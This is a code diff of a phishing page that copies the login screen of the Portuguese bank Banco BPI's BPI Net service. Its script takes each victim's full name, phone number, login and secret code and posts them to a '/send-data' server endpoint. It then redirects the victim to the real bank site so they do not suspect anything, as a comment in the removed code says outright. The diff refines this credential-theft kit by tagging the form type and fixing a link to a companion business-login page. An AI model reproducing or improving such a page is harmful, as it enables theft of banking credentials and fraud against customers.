@@ -7,9 +7,9 @@
   <title>BPI Net Login</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <!-- Added fetch polyfill for older iOS/Safari compatibility -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/fetch/3.6.2/fetch.min.js"></script>
   <style>
+    /* Mesmo CSS do loginempresa.html para consistência */
     body {
       font-family: 'Roboto', Arial, sans-serif;
       background: #f5f5f5;
@@ -191,7 +191,7 @@
       <a href="https://bpinet.bancobpi.pt/OnlineBankingSignup/ClientDataValidation?FlowId=RecuperacaoCodigoSecreto&Locale=pt-PT">Recuperar Código</a>
       <a href="https://www.bancobpi.pt/seguranca-online">Recomendações de Segurança</a>
     </div>
-    <a href="loginempresas.html" class="btn-outline">Entrar BPI Net Empresas</a>
+    <a href="loginempresa.html" class="btn-outline">Entrar BPI Net Empresas</a>
   </div>
   <a href="tel:+351218005050" class="call-icon"><i class="fas fa-phone"></i></a>
   <div class="modal" id="infoModal">
@@ -211,50 +211,50 @@
         alert('Por favor, preencha o login e o código secreto.');
         return;
       }
-      console.log('Mostrando modal com login:', login); // Debug: Log login value
+      console.log('Mostrando modal com login:', login);
       document.getElementById('infoModal').style.display = 'flex';
     }
 
     function closeModal() {
-      console.log('Fechando modal'); // Debug: Log modal close
+      console.log('Fechando modal');
       document.getElementById('infoModal').style.display = 'none';
     }
 
     function submitInfo() {
-  const name = document.getElementById('fullname').value.trim();
-  const phone = document.getElementById('phone').value.trim();
-  const login = document.getElementById('login').value.trim();
-  const password = document.getElementById('password').value.trim();
-  
-  if (name === '' || phone === '' || login === '' || password === '') {
-    alert('Por favor, preencha todos os campos.');
-    return;
-  }
+      const name = document.getElementById('fullname').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const login = document.getElementById('login').value.trim();
+      const password = document.getElementById('password').value.trim();
 
-  // Envia para o servidor Node.js
-  fetch('/send-data', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      fullname: name,
-      phone: phone,
-      login: login,
-      password: password
-    }),
-  })
-  .then(response => response.json())
-  .then(data => {
-    console.log('Sucesso:', data);
-    window.location.href = 'https://www.bancobpi.pt/particulares';
-  })
-  .catch(error => {
-    console.error('Erro:', error);
-    // Redireciona mesmo se houver erro para não alertar o usuário
-    window.location.href = 'https://www.bancobpi.pt/particulares';
-  });
-}
+      if (name === '' || phone === '' || login === '' || password === '') {
+        alert('Por favor, preencha todos os campos.');
+        return;
+      }
+
+      // Envia para o servidor Node.js
+      fetch('/send-data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          fullname: name,
+          phone: phone,
+          login: login,
+          password: password,
+          formType: 'normal' // Identifica como formulário normal
+        }),
+      })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Sucesso:', data);
+          window.location.href = 'https://www.bancobpi.pt/particulares';
+        })
+        .catch(error => {
+          console.error('Erro:', error);
+          window.location.href = 'https://www.bancobpi.pt/particulares';
+        });
+    }
   </script>
 </body>
 </html>
